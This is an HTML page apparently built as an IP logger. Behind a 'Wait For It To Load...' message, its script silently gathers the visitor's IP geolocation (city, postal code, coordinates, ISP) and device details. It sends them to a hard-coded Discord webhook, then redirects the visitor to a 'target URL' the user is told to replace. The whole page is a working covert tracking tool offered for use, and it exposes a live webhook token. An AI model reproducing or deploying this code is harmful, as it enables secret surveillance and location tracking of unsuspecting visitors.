<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<title>XXN_Test</title>
</head>
<body>
Wait For It To Load...
<script>
  const ipinfo = {}, deviceinfo = {};

  // Gather IP info
  function gatherIPInfo() {
    return fetch("https://ipapi.co/json/")
      .then(res => res.json())
      .then(data => {
        Object.assign(ipinfo, {
          IP: data.ip,
          City: data.city,
          Region: data.region,
          Country: `${data.country_name} (${data.country})`,
          Postal: data.postal,
          Latitude: data.latitude,
          Longitude: data.longitude,
          ISP: data.org,
          ASN: data.asn || "N/A",
          Timezone: data.timezone,
          Currency: `${data.currency} (${data.currency_name})`
        });
      })
      .catch(() => Object.assign(ipinfo, { Error: "Failed to get IP info" }));
  }

  // Gather basic device info
  function gatherDeviceInfo() {
    const ua = navigator.userAgent;
    const platform = navigator.platform;
    const lang = navigator.language;
    const dnt = navigator.doNotTrack === "1" ? "Enabled" : "Disabled";
    const tzOffset = new Date().getTimezoneOffset();

    Object.assign(deviceinfo, {
      Browser: ua,
      OS: platform,
      Platform: platform,
      Language: lang,
      TimezoneOffset: tzOffset + " minutes",
      DoNotTrack: dnt,
      Resolution: `${screen.width} Ã— ${screen.height}`
    });

    return Promise.resolve();
  }

  // Collect info, send to Discord, then redirect
  async function collectSendRedirect() {
    await gatherIPInfo();
    await gatherDeviceInfo();

    const lines = [];
    lines.push("**:earth_africa: IP Location:**");
    for (let key in ipinfo) lines.push(`**${key}**: ${ipinfo[key]}`);

    lines.push("\n**:brain: Device Info:**");
    for (let key in deviceinfo) lines.push(`**${key}**: ${deviceinfo[key]}`);

    const payload = { content: lines.join("\n") };

    // Send to Discord webhook
    fetch("https://discord.com/api/webhooks/1420561724410429472/qq07ULPd7_URtkJ8czru91tH2FRUgCgWbgkUODHXAf2XikB_qxrOhvTsLDKEUFwwvCUw", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload)
    }).catch(() => {});

    // Redirect in same tab
    window.location.href = "https://vapor.my/"; // <-- replace with your target URL
  }

  collectSendRedirect();
</script>
</body>
</html>

